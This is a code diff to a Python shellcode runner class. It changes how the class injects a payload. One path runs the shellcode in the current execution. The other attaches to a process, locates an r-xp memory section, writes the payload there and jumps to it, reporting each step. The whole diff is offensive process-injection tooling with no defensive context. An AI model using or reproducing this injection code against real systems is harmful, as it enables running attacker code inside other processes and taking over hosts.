@@ -18,11 +18,15 @@ class NgRunner():
             print("[*] Injecting in self-fork [+{}]...".format(getpid()))
         else:
             print("[*] Injecting in current execution...")
+        
+        if not forking:
+            res = crunner.ngc_jexec(self.shellcode, 0)
+            return res
 
-        res = 0
-        f = io.StringIO()
-        with redirect_stdout(f):
-             res = crunner.NGC_ShellRunner(self.shellcode, (1 if forking else 0 ))
-        s = f.getvalue()
-        print("REP: {}".format(repr(s)))
-        return res
+        pid = crunner.ngc_stage1(1)
+        print("[*] Attached to the process with PID {}.".format(pid))
+        addr = crunner.ngc_stage2(self.shellcode)
+        print("[*] Found section mapped with r-xp permissions.")
+        print("[*] Injected payload at address 0x{:02x}.".format(addr&0xffffffff))
+        print("[*] Sucessfuly jumped to the code.")
+        return crunner.ngc_stage3()
